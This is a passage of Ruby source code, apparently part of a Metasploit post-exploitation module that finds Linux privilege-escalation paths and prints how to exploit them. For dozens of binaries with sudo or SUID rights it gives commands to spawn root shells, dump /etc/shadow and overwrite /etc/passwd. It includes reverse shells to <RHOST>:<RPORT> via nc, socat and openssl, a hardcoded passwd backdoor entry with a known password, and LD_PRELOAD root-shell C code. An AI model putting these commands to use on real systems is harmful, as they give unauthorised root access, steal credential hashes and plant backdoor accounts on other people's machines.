          @@quick_fails_output << "\n#{instructions}\n"  # Get PE instructions based on checked file
        end
      end
    end
  end

  def check_sudo_read_file_bins(sudo_bins, users, auth)
    bins = SUDO_SUID_READ_FILE.dup
    sudo_bins.each do |sudo_bin|
      bins.each do |bin|
        if sudo_bin =~ /(\/| )(#{bin})( |$)/
          if sudo_bin =~ /(\/| )(#{bin}$)/
            if priv_user(users) && (!auth || datastore['PASSWD'])
              check_message("Possible Read File: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}")
            elsif priv_user(users) && (auth && !datastore['PASSWD'])
              check_message("Possible Read File: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
            elsif !priv_user(users) && (!auth || datastore['PASSWD'])
              check_message("FYI - Read File: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}")
            else
              check_message("FYI - Read File: User #{@@user} has unrestricted sudo rights to #{sudo_bin} as users: #{users.join(", ")}. However, a password is required.")
            end
          else
            check_message("FYI - Read File: User #{@@user} has restricted sudo rights to #{bin} as users: #{users.join(", ")}. Rights = #{sudo_bin}")
          end
          file = bin.split("/").last.strip
          instructions = sudo_suid_instructions(file, "sudo")
          print_good("#{instructions}")
          @@quick_fails_output << "\n#{instructions}\n"  # Get PE instructions based on checked file
        end
      end
    end
  end

  def sudo_suid_instructions(file, check)
    output = ""
    
    if check == "sudo"
      prefix = "sudo "
      shp = ""
    else 
      prefix = "./"
      shp = " -p"
    end

    case file
    when "apt"
      output << "\tsudo apt update -o APT::Update::Pre-Invoke::=/bin/sh" ## Sudo only
    when "apt-get"
      output << "\tsudo apt-get changelog apt\n\t!/bin/sh" ## Sudo only
    when "arp"
      output << "\t#{prefix}arp -v -f /etc/shadow"
    when "ash"
      output << "\tsudo /bin/ash" if check == "sudo"
      output << "\t./ash -p" if check == "suid"
    when "awk"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}awk 'BEGIN {system(\"/bin/sh\")}'"
    when "base64"
      output << "\t#{prefix}base64 /etc/shadow | base64 --decode"
    when "bash"
      output << "\tsudo /bin/sh" if check == "sudo"
      output << "\t./bash -p" if check == "suid"
    when "busybox"
      output << "\t#{prefix}busybox sh"
    when "cat"
      output << "\t#{prefix}cat /etc/shadow"
    when "chmod", "chown"
      output << "\tDo you really need help with this one? ;)"
    when "cp"
      output << "\tClone and modify /etc/passwd, use sudo cp to overwrite."
    when "cpan"
      output << "\tsudo cpan\n"
      output << "\t! exec '/bin/sh'" # Sudo only
    when "cpulimit"
      output << "\tsudo cpulimit -l 100 -f /bin/sh" # Sudo only
    when "crontab"
      output << "\tsudo crontab -e" # Sudo only
    when "csh"
      output << "\tsudo /bin/csh" if check == "sudo"
      output << "\t./csh -b" if check == "suid"
    when "curl"
      output << "\t#{prefix}curl http://<your ip>/passwd -o /etc/passwd"
    when "cut"
      output << "\t#{prefix}cut -d \"\" -f1 /etc/shadow"
    when "dash"
      output << "\tsudo /bin/dash" if check == "sudo"
      output << "\t./dash -p" if check == "sudo"
    when "date"
      output << "\t#{prefix}date -f /etc/shadow"
    when "dd"
      output << "\tCan write to restricted file"
      output << "\tcat passwd | #{prefix}dd of=/etc/passwd"
    when "diff"
      output << "\t#{prefix}diff --line-format=%L /dev/null /etc/passwd"
    when "dmesg"
      output << "\tsudo dmesg -H\n" #SUDO only
      output << "\t!/bin/bash"
    when "dmsetup"
      output << "\t#{prefix}dmsetup create base <<EOF\n"
      output << "\t0 3534848 linear /dev/loop0 94208\n"
      output << "\tEOF\n"
      output << "\t#{prefix}dmsetup ls --exec '/bin/sh#{shp} -s'"
    when "dnf"
      output << "\tTF=$(mktemp -d); echo 'exec /bin/sh' > $TF/x.sh; fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n" # Sudo only
      output << "\tsudo dnf install -y x-1.0-1.noarch.rpm"
    when "docker"
      output << "\t#{prefix}docker run -v /:/mnt --rm -it alpine chroot /mnt sh#{shp}"
    when "dpkg"
      output << "\tTF=$(mktemp -d); echo 'exec /bin/sh' > $TF/x.sh; fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n" # Sudo only
      output << "\tsudo dpkg -i x_1.0_all.deb"
    when "easy_install"
      output << "\tTF=$(mktemp -d); echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; sudo easy_install $TF" # Sudo only
    when "ed"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}ed\n"
      output << "\t!/bin/sh"
    when "emacs"
      output << "\t#{prefix}emacs -Q -nw --eval '(term \"/bin/sh#{shp}\")'"
    when "env"
      output << "\t#{prefix}env /bin/sh#{shp}"
    when "expand"
      output << "\t#{prefix}expand /etc/shadow"
    when "expect"
      output << "\t#{prefix}expect -c 'spawn /bin/sh#{shp}; interact'"
    when "file"
      output << "\t#{prefix}file -m /etc/shadow"
    when "find"
      output << "\t#{prefix}find /home -exec /bin/sh#{shp} \\; -quit"
    when "flock"
      output << "\t#{prefix}flock -u / /bin/sh#{shp}"
    when "fmt"
      output << "\t#{prefix}fmt -pNON_EXISTING_PREFIX /etc/shadow"
    when "fold"
      output << "\t#{prefix}fold -w99999999 /etc/shadow"
    when "ftp"
      output << "\tsudo ftp\n" # Sudo only
      output << "\t!/bin/sh"
    when "gdb"
      output << "\tsudo gdb -nx -ex '!sh' -ex quit" if check == "sudo"
      output << "\t./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n\tgdb must be compiled with python support." if check == "suid"
    when "gimp"
      output << "\tsudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"/bin/sh\")'" if check == "sudo"
      output << "\t./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" if check == "sudo"
    when "git"
      output << "\tsudo git help config\n\t!/bin/sh\n\t--OR--\n\nPAGER='sh -c \"exec sh 0<&1\"' git -p help" if check == "sudo"
      output << "\tPAGER='sh -c \"exec sh 0<&1\"' ./git -p help\n\tDebian <= Stretch(9) Systems Only" if check == "suid"
    when "grep"
      output << "\t#{prefix}grep '' /etc/shadow"
    when "head"
      output << "\t#{prefix}head -c1G /etc/shadow"
    when "ionice"
      output << "\t#{prefix}ionice /bin/sh#{shp}"
    when "ip"
      output << "\t#{prefix}ip -force -batch /etc/shadow\n"
      output << "\tIf CONFIG_NET_NS=y try:\n\t#{prefix}ip netns add foo\n\t#{prefix}ip netns exec foo /bin/sh#{shp}\n\t#{prefix}ip netns delete foo"
    when "irb"
      output << "\tsudo irb\n"
      output << "\texec '/bin/sh'" # Sudo only
    when "jjs"
      output << "\techo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs" if check == "sudo"
      output << "\techo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs" if check == "suid"
    when "journalctl"
      output << "\tsudo journalctl\n" # Sudo only
      output << "\t!/bin/sh"
    when "jq"
      output << "\t#{prefix}jq -Rr . /etc/shadow"
    when "jrunscript"
      output << "\tsudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"" if check == "sudo"
      output << "\t./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"" if check == "suid"
    when "ksh"
      output << "\tsudo ksh" if check == "sudo"
      output << "\t./ksh -p" if check == "suid"
    when "less"
      output << "\tsudo less /etc/hosts\n\t!/bin/sh\n" if check == "sudo"
      output << "\tRead File:\n\t#{prefix}less /etc/shadow"
    when "logsave"
      output << "\t#{prefix}logsave /dev/null /bin/sh -i#{shp}"
    when "ltrace"
      output << "\tsudo ltrace -b -L /bin/sh" # Sudo only
    when "lua"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}lua -e \"os.execute('/bin/sh')\""
    when "mail"
      output << "\tsudo mail --exec='!/bin/sh'" # Sudo only
    when "make"
      output << "\t#{prefix}make -s --eval=$'x:\\n\\t-'\"/bin/sh#{shp}\""
    when "man"
      output << "\tsudo man bash\n" # Sudo only
      output << "\t!/bin/sh"
    when "more"
      output << "\tTERM= sudo more /etc/profile\n\t!/bin/sh\n\t--OR--\n" if check == "sudo"
      output << "\tRead File:\n\t#{prefix}more /etc/shadow"
    when "mount"
      output << "\tsudo mount -o bind /bin/bash /bin/mount\n" # Sudo only
      output << "\tsudo mount"
    when "mtr"
      output << "\tsudo mtr --raw -F /etc/shadow" # Sudo only
    when "mv"
      output << "\t#{prefix}mv passwd /etc/passwd"
    when "mysql"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}sudo mysql -e '\\! /bin/sh'"
    when "nano"
      output << "\tsudo nano\n\t^R^X\n\treset; sh 1>&0 2>&0\n\t--OR--\n\tnano -s /bin/sh\n\t/bin/sh\n\t^T" if check == "sudo"
      output << "\t./nano /etc/passwd" if check == "suid"
    when "nc", "netcat"
      output << "\tnc and netcat must have -e option.\n"
      output << "\t#{prefix}nc -e '/bin/sh#{shp}' <RHOST> <RPORT>"
    when "ncat"
      output << "\t#{prefix}ncat <RHOST> <RPORT> -e '/bin/sh#{shp}'"
    when "nice"
      output << "\t#{prefix}nice /bin/sh#{shp}"
    when "nl"
      output << "\t#{prefix}nl -bn -w1 -s '' /etc/shadow"
    when "nmap"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\tTF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; #{prefix}nmap --script=$TF\n"
      output << "\tInput echo disabled, run pybash for control"
    when "node"
      output << "\tsudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'" if check == "sudo"
      output << "\t./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'" if check == "suid"
    when "od"
      output << "\t#{prefix}od -An -c -w9999 /etc/shadow"
    when "openssl"
      output << "\tShell on Debian <= Stretch(9) Systems Only. Use write file command for others.\n" if check == "suid"
      output << "\tOn Kali:\n\topenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\topenssl s_server -quiet -key key.pem -cert cert.pem -port <RPORT>\n"
      output << "\tOn Vic:\n\tmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | #{prefix}openssl s_client -quiet -no_ign_eof -connect <RHOST>:<RPORT> > /tmp/s; rm /tmp/s\n\t--OR--\n"
      output << "\tcat passwd | #{prefix}openssl enc -out /etc/passwd"
    when "perl"
      output << "\tsudo perl -e 'exec \"/bin/sh\";'" # Sudo Only
    when "pg"
      output << "\tsudo pg /etc/profile\n\t!/bin/bash\n\t--OR--\n" if check == "sudo"
      output << "\t#{prefix}pg /etc/shadow"
    when "php"
      output << "\tsudo php -r \"system('/bin/sh');\"" if check == "sudo"
      output << "\t./php -r \"pcntl_exec('/bin/sh', ['-p']);\"" if check == "suid"
    when "pic"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}pic -U\n"
      output << "\t.PS\n"
      output << "\tsh X sh X"
    when "pico"
      output << "\tShell on Debian <= Stretch(9) Systems Only. Use write file for others.\n" if check == "suid"
      output << "\tsudo pico\n\t^R^X\n\treset; sh 1>&0 2>&0\n--OR--\n"
      output << "\t#{prefix}pico /etc/passwd\n\tDATA\n\t^O"
    when "pip"
      output << "\tTF=$(mktemp -d); echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; sudo pip install $TF" # Sudo Only
    when "puppet" # DONE
      output << "\tsudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"" # Sudo Only
    when "python"
      output << "\tsudo python -c 'import pty; pty.spawn(\"/bin/bash\")'" if check == "sudo"
      output << "\t./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" if check == "suid"
    when "python3"
      output << "\tsudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" if check == "sudo"
      output << "\t./python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" if check == "suid"
    when "readelf"
      output << "\t#{prefix}readelf -a @/etc/shadow"
    when "red"
      output << "\tsudo red file_to_write\n\ta\n\tDATA\n\t.\n\tw\n\tq" # Sudo Only
    when "rlwrap"
      output << "\tsudo rlwrap /bin/sh" if check == "sudo"
      output << "\t./rlwrap -H /dev/null /bin/sh -p" if check == "suid"
    when "rpm"
      output << "\tTF=$(mktemp -d); echo 'exec /bin/sh' > $TF/x.sh; fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\tsudo rpm -ivh x-1.0-1.noarch.rpm\n\t--OR--\n" if check == "sudo"
      output << "\tsudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'" if check == "sudo"
      output << "\t./rpm --eval '%{lua:os.execute(\"/bin/sh\", \"-p\")}'" if check == "suid"
    when "rpmquery"
      output << "\tsudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'" if check == "sudo"
      output << "\t./rpmquery --eval '%{lua:posix.exec(\"/bin/sh\", \"-p\")}'" if check == "suid"
    when "rsync"
      output << "\t#{prefix}rsync -e 'sh#{shp} -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    when "ruby"
      output << "\tsudo ruby -e \"exec '/bin/sh'\"" # Sudo Only
    when "run-mailcap"
      output << "\tsudo run-mailcap --action=view /etc/hosts\n" # Sudo Only
      output << "\t!/bin/bash"
    when "run-parts"
      output << "\tsudo run-parts --new-session --regex '^sh$' /bin" if check == "sudo"
      output << "\t./run-parts --new-session --regex '^sh$' /bin --arg='-p'" if check == "suid"
    when "rvim"
      output << "\tPython Shell requires that rvim is compiled with Python suppport. Use ':py3' for python3\n"
      output << "\tsudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n\t--OR--\n\tsudo rvim -c ':lua os.execute(\"reset; exec sh\")'" if check == "sudo"
      output << "\t./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'" if check == "suid"
    when "scp"
      output << "\tTF=$(mktemp); echo '/bin/sh 0<&2 1>&2' > $TF; chmod +x \"$TF\"; sudo scp -S $TF x y:"
    when "screen"
      output << "\tsudo screen" # Sudo Only
    when "script"
      output << "\tscript -qc /bin/sh /dev/null" # Sudo Only
    when "sed"
      output << "\t#{prefix}sed -n '1e exec /bin/bash 1>&0' /etc/passwd"
    when "service"
      output << "\tsudo service ../../bin/sh" # Sudo Only
    when "setarch"
      output << "\tsudo setarch $(arch) /bin/sh" # Sudo Only
    when "sftp"
      output << "\tsudo sftp you@kali\n" # Sudo Only
      output << "\t!/bin/sh"
    when "shuf"
      output << "\t#{prefix}shuf -e DATA -o <file to write>"
    when "smbclient"
      output << "\tsudo smbclient '\\\\attacker\\share'\n" # Sudo Only
      output << "\t!/bin/sh"
    when "sh"
      output << "\tsudo /bin/sh" if check == "sudo"
      output << "\t./sh -p" if check == "suid"
    when "socat"
      output << "\tOn Kali:\n\tsocat file:`tty`,raw,echo=0 tcp-listen:<RPORT>\n\tOn Vic:\n\t#{prefix}socat tcp-connect:<RHOST>:<RPORT> exec:'/bin/sh#{shp}',pty,stderr,setsid,sigint,sane"
    when "sort"
      output << "\t#{prefix}sort -m /etc/shadow"
    when "sqlite3"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}sqlite3 /dev/null '.shell /bin/sh'"
    when "ssh"
      output << "\tsudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x" # Sudo Only
    when "start-stop-daemon"
      output << "\tsudo start-stop-daemon -n $RANDOM -S -x /bin/sh" if check == "sudo"
      output << "\t./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p" if check == "suid"
    when "stdbuf"
      output << "\t#{prefix}stdbuf -i0 /bin/sh#{shp}"
    when "strace"
      output << "\t#{prefix}strace -o /dev/null /bin/sh#{shp}"
    when "systemctl"
      output << "\tsudo systemctl\n\t!/bin/sh" if check == "sudo"
      output << "\thttps://gtfobins.github.io/gtfobins/systemctl/#suid" if check == "suid"
    when "tail"
      output << "\t#{prefix}tail -c1G /etc/shadow"
    when "tar"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    when "taskset"
      output << "\t#{prefix}taskset 1 /bin/sh#{shp}\n\t--OR--\n"
      output << "\t#{prefix}taskset 1 echo 'sn0wfa11:$1$5wAs2Vek$MolttqqR2ngg29PV6DacY1:0:0::/root:/bin/bash' >> /etc/passwd\n\tpassword = '12345'"
    when "tclsh"
      output << "\t#{prefix}tclsh\n\texec /bin/sh#{shp} <@stdin >@stdout 2>@stderr"
    when "tcpdump"
      output << "\tTF=$(mktemp); echo /bin/sh > $TF; chmod +x $TF; sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF" # Sudo Only
    when "tee"
      output << "\tcat passwd | #{prefix}tee -a /etc/passwd"
    when "telnet"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}telnet <RHOST> <RPORT>\n\t^]\n\t!/bin/sh"
    when "tftp"
      output << "\t#{prefix}tftp <RHOST>\n\tput /etc/passwd"
    when "time"
      output << "\t#{prefix}time /bin/sh#{shp}"
    when "timeout"
      output << "\t#{prefix}timeout --foreground 7d /bin/sh#{shp}"
    when "tmux"
      output << "\tsudo tmux" # Sudo Only
    when "ul"
      output << "\t#{prefix}ul /etc/shadow"
    when "unexpand"
      output << "\t#{prefix}unexpand -t99999999 /etc/shadow"
    when "uniq"
      output << "\t#{prefix}uniq /etc/shadow"
    when "unshare"
      output << "\tsudo unshare /bin/sh" if check == "sudo"
      output << "\t./unshare -r /bin/sh" if check == "suid"
    when "vi"
      output << "\tsudo vi\n\t<escape> then ':shell'\n\t--OR--\n\tsudo vi -c ':!/bin/sh' /dev/null" # Sudo only
    when "vim"
      output << "\tsudo vim -c ':!/bin/sh'\n\t--OR--\n" if check == "sudo"
      output << "\tPython shell requires that vim is compiled with Python support\n"
      output << "\tsudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\n" if check == "sudo"
      output << "\tLua shell requires that vim is compiled with lua support\n\tsudo vim -c ':lua os.execute(\"reset; exec sh\")'" if check == "sudo"      
      output << "\t./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'" if check == "suid"
    when "watch"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\t#{prefix}watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    when "wget"
      output << "\tCopy off /etc/passwd and add sn0wfa11:$1$5wAs2Vek$MolttqqR2ngg29PV6DacY1:0:0::/root:/bin/bash\n"
      output << "\tThen bring it back over with:\n"
      output << "\t#{prefix}wget -O /etc/passwd http://<your ip>/passwd"
    when "wish"
      output << "\tsudo wish\n"
      output << "\texec /bin/sh <@stdin >@stdout 2>@stderr" # Sudo Only
    when "xargs"
      output << "\t#{prefix}xargs -a /dev/null /bin/sh#{shp}"
    when "xxd"
      output << "\t#{prefix}xxd \"/etc/shadow\" | xxd -r"
    when "yum"
      output << "\thttps://gtfobins.github.io/gtfobins/yum/" # Sudo Only
    when "zip"
      output << "\tDebian <= Stretch(9) Systems Only\n" if check == "suid"
      output << "\ttouch pwn.txt; #{prefix}zip 1.zip pwn.txt -T --unzip-command=\"sh -c /bin/sh\"; rm -f 1.zip; rm pwn.txt;"
    when "zsh"
      output << "\t#{prefix}zsh"
    when "zypper"
      output << "\tsudo zypper x"# Sudo Only
    end
    return output
  end

  def ld_preload_instructions
    output = "\tInstructions for exploiting LD_PRELOAD in sudo:\n"
    output << "\tcd /tmp\n\tnano shell.c\n--------------------------------------\n"
    output << "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n"
    output << "void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/sh\"); }\n"
    output << "--------------------------------------\n"
    output << "\tgcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\tsudo LD_PRELOAD=/tmp/shell.so find\n"
    return output
  end

  ###########################################
  # Quck-Fail Checks
  ###########################################

  def world_writeable(file_name)
    result = execute("ls -al #{file_name} 2>/dev/null | awk '$1 ~ /^........w./'")
    return result.downcase =~ /#{file_name}/
  end

  def shellshock
    output = ""
    result = execute("env X='() { :; }; echo \"CVE-2014-6271 vulnerable\"' bash -c date\n")
    if result =~ /vulnerable/
      print_good("Possible Fail: Shellshock Vulnerable. Look for web app or process running as root to exploit")
      output << "\n[+] Possible Fail!: Shellshock Vulnerable. Look for web app process running as root to exploit.\n"
      return output
    end
    return ""
  end

  def mysql_nopass
    output = ""
    result = execute("mysql -uroot -e 'show databases;' 2>/dev/null")
    if result.downcase =~ /database/
      print_good("Fail: mysql does not require a password for root user.")
      output << "\n[+] Fail: mysql does not require a password for root user.\n"
      output << format(result)
      return output
    end
    return ""
  end

  def mysql_as_root
    output = ""
    result = execute("ps aux | grep mysql | grep root | grep -v grep")
    if result.downcase =~ /mysql/ && !result.downcase =~ /mysqld_safe/
      print_good("QUICKFAIL!: mysql is running as root!")
      output << "\n[+] QUICKFAIL!: mysql is running as root!\n"
      output << format(result)
      return output
    end
    return ""
  end

  def sudo_group
    user = execute("whoami").downcase
    output = ""
    result = file_read_grep("/etc/group", "sudo")
    if result.downcase =~ /#{user}/
      print_good("#{user} is in sudoers group. Ya gotta password?")
      output << "\n#{user} is in sudoers group. Ya gotta password?\n"
      output << format(result)
    end
    return output
  end

  def sudo_su_check
    output = ""
    if datastore['PASSWD']
      password = datastore['PASSWD']
      result = execute("echo #{password} | sudo -S su -c id", 15)
    else
      result = execute("sudo -S su -c id", 15)
    end
    if result.downcase =~ /\(root\)/
      print_good("QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!")
      output << "\n[+] QUICKFAIL!: User #{@@user} has sudo su rights! And... You're DONE!\n"
      output << format(result)
    end
    return output
  end

  def world_writable_passwd
    output = ""
    result = world_writeable("/etc/passwd")
    if result
      print_good("QUICKFAIL!: /etc/passwd is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/passwd is world writable!\n"
      output << format(result)
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def world_writable_shadow
    output = ""
    result = world_writeable("/etc/shadow")
    if result
      print_good("QUICKFAIL!: /etc/shadow is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/shadow is world writable!\n"
      output << format(result)
      output << "\nNOTE: YOU NEED TO REBOOT TO RELOAD /etc/shadow!!! Is /etc/shadow readable?\n"
      output << "\tUse hash: $1$5wAs2Vek$MolttqqR2ngg29PV6DacY1\n"
      output << "\tPassword: 12345\n"
      output << "\t\"That's the same combination I have on my luggage!\"\n"
      return output
    end
    return ""
  end

  def readable_shadow
    output = ""
    result = file_read("/etc/shadow")
    if result
      print_good("Fail: /etc/shadow is readable")
      output << "\n[+] Fail: /etc/shadow is readable\n"
      output << format(result)
      return output
    end
    return ""
  end

  def check_no_root_squash
    output = ""
    result = file_read_grep("/etc/exports", "no_root_squash")
    if result
      print_good("QUICKFAIL!: /etc/exports has no_root_squash!")
      output << "\n[+] QUICKFAIL!: /etc/exports has no_root_squash!\n"
      output << format(result)
      output << "\tMount an NFS Share\n"
      output << "\tAnd... Away, we go...!\n"
      return output
    end
    return ""
  end

  def world_writable_exports
    output = ""
    result = world_writeable("/etc/exports")
    if result
      print_good("QUICKFAIL!: /etc/exports is world writable!")
      output << "\n[+] QUICKFAIL!: /etc/exports is world writable!\n"
      output << format(result)
      output << "\tAdd it a little bit of 'no_root_squash'\n"
      output << "\tMount an NFS Share\n"
      output << "\tAnd... Away, we go...!\n"
      return output
    end
    return ""
  end

  def docker_group
    output = ""
    result = execute("id")
    if result.downcase =~ /\(docker\)/
      print_good("QUICKFAIL!: User #{@@user} is in the 'docker' group!")
      output << "\n[+] QUICKFAIL!: User #{@@user} is in the 'docker' group!\n"
      output << format(result)
      output << "\tTry a little: 'exploit/linux/local/docker_daemon_privilege_escalation'\n"
      return output
    end
    return ""
  end

end
